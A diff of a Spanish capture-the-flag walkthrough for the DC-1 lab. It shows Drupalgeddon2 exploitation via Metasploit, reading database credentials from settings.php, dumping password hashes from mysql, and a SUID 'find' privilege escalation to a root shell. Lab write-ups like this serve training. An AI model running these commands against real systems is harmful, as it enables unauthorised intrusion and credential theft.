@@ -27,8 +27,11 @@ Descargaremos la máquina y la importaremos en VirtualBox. Utilizaremos una máq
 2. Asignar ambas máquinas (DC-1 y Kali Linux) a la red NAT creada.
 
 ![imagen](https://github.com/user-attachments/assets/a4ed4b73-b0f4-44a6-a43f-198c25e2085d)
+
 ![d5860fdf-d4e6-410e-bdb0-3e733b9f506b](https://github.com/user-attachments/assets/275fc2b6-b7f0-4e81-b9e5-cbffc085de6c)
+
 ![imagen 1](https://github.com/user-attachments/assets/3bd9d42a-afad-4f6e-a21d-51382075e439)
+
 
 ---
 
@@ -43,21 +46,22 @@ Para descubrir la dirección IP de la máquina del laboratorio, utilizaremos `ne
    ifconfig
    ```
    - Identificar la interfaz de red conectada a la red NAT (`eth0`).
-![imagen 2](https://github.com/user-attachments/assets/6795f97f-dd1b-401e-8804-1af490084cdc)
+   
+   ![imagen 2](https://github.com/user-attachments/assets/6795f97f-dd1b-401e-8804-1af490084cdc)
 
 3. Escanear la red para detectar la IP de DC-1:
    ```
-   netdiscover -r 192.168.56.0/24
+   sudo netdiscover -r 10.0.2.0/24
    ```
    ![imagen 3](https://github.com/user-attachments/assets/277793a5-f4f3-4c75-8ebf-cabad90a7552)
+   
    ![imagen 4](https://github.com/user-attachments/assets/0aca0772-6c4f-47ca-9788-d970e2cf5e96)
 
-
-Comprobamos que la máquina es accesible con `ping`:
-```
-ping <IP_DC-1>
-```
-![imagen 5](https://github.com/user-attachments/assets/ccb60033-431d-4424-94e2-6d428ec5316b)
+4. Comprobamos que la máquina es accesible con `ping`:
+   ```
+   ping <IP_DC-1>
+   ```
+   ![imagen 5](https://github.com/user-attachments/assets/ccb60033-431d-4424-94e2-6d428ec5316b)
 
 ---
 
@@ -65,16 +69,17 @@ ping <IP_DC-1>
 ## Escaneo de Red y Enumeración
 Ejecutaremos `nmap` para escanear puertos abiertos y detectar los servicios en ejecución:
 ```
-nmap -sC -sV -A <IP_DC-1>
+nmap -sC -sV -A 10.0.2.5
 ```
 ![imagen 6](https://github.com/user-attachments/assets/56d94af6-5e79-454a-a96f-d4cdc2e82c4c)
 
 
 Identificamos que en el puerto **80** está corriendo **Drupal**. Para confirmar la versión, usamos `whatweb`:
 ```
-whatweb <IP_DC-1>
+whatweb 10.0.2.5
 ```
 ![imagen 7](https://github.com/user-attachments/assets/71b0a25e-3201-4019-a0ec-4e4f7bfbfb6d)
+
 ![imagen 8](https://github.com/user-attachments/assets/35b5771e-a500-442e-b843-b507d7bdfe61)
 
 
@@ -88,10 +93,11 @@ Usaremos `metasploit` para explotar la vulnerabilidad de Drupal.
 ```
 msfconsole
 use exploit/unix/webapp/drupal_drupalgeddon2
-set rhost <IP_DC-1>
+set rhosts 10.0.2.5
 exploit
 ```
 ![imagen 9](https://github.com/user-attachments/assets/26c75737-0dd2-4389-a870-9b180b9a51b9)
+
 ![imagen 10](https://github.com/user-attachments/assets/6dc1451e-e88e-4f90-a315-524b44a4f4a8)
 
 
@@ -101,6 +107,7 @@ ls
 ```
 
 ![imagen 11](https://github.com/user-attachments/assets/42c53f5e-a405-438e-94ed-c332f341bea1)
+
 ![imagen 12](https://github.com/user-attachments/assets/a8a10815-2a2c-4e22-9db7-6b6afef2f1cb)
 
 ## Flag 1
@@ -111,6 +118,7 @@ Buscamos el archivo de configuración de Drupal:
 cat /var/www/html/sites/default/settings.php
 ```
 ![imagen 13](https://github.com/user-attachments/assets/a2b82429-f3df-4f97-8592-071ab499c959)
+
 ![imagen 14](https://github.com/user-attachments/assets/02859513-3847-4f77-9c6f-89e07a81b05b)
 
 Encontramos la segunda bandera `flag2.txt` junto con credenciales de acceso a la base de datos.
@@ -128,28 +136,34 @@ python -c "import pty; pty.spawn('/bin/bash')"
 
 Utilizamos las credenciales de la base de datos para acceder a `mysql`:
 ```
-mysql -u root -p
+mysql -u dbuser -p
 show databases;
 use drupaldb;
 show tables;
 select name, pass from users;
 ```
 ![imagen 16](https://github.com/user-attachments/assets/c8d8e8a6-64e1-4e74-b0bb-b84188d71bce)
+
 ![imagen 17](https://github.com/user-attachments/assets/f6b5f408-f74c-472a-89d8-ae73828a361a)
 
+
+# REVISAR
 Podemos crackear el hash con `hashcat` o `john the ripper`, pero encontramos un exploit en `searchsploit` para crear un usuario administrador.
-Para obtener la contraseña del usuario admin podemos usar `hashcat` o `john the ripper`. Sin embargo, con searchsploit descubrimos un exploit que nos permite crear un usuario administrador, el cual utilizaremos para acceder al CMS: 
+Para obtener la contraseña del usuario admin podemos usar `hashcat` o `john the ripper`. Sin embargo, con searchsploit descubrimos un exploit que nos permite crear un usuario administrador, el cual utilizaremos para acceder al CMS:
+
+
+
+
+
 ![imagen 18](https://github.com/user-attachments/assets/1ab9d5ba-9577-4a08-a0fb-a108e2f2f014)
 
 ![imagen 19](https://github.com/user-attachments/assets/33e29ef2-7dac-4322-a6dd-38dadfa05c49)
 
 ![imagen 20](https://github.com/user-attachments/assets/4a346129-6b82-44a8-9365-5ed0626aa8fc)
 
-
 ![imagen 21](https://github.com/user-attachments/assets/b6db0190-bb5e-40ff-90c6-7006bd3ac56d)
 
 ![imagen 22](https://github.com/user-attachments/assets/2a209a97-be92-4d1a-995d-ccad0d89eb33)
-
 
 ![imagen 23](https://github.com/user-attachments/assets/b4a43a90-061d-42ed-88b8-1e9e062d20aa)
 
@@ -182,8 +196,14 @@ Identificamos `find` como vulnerable. Consultamos GTFOBins y explotamos `find` p
 ```
 find . -exec /bin/sh \; -quit
 ```
+
 ![imagen 26](https://github.com/user-attachments/assets/68c70f0e-0dab-4dae-9aa9-9409d6cab305)
 
 
 Obtenemos la bandera final en `/root/flag.txt`.
+
+
+## Variante utilizando unn reverse shell 
+
+![reverse_shell](https://github.com/user-attachments/assets/b1cf36a8-1ae9-4afa-8290-81c30f7f8422)
 
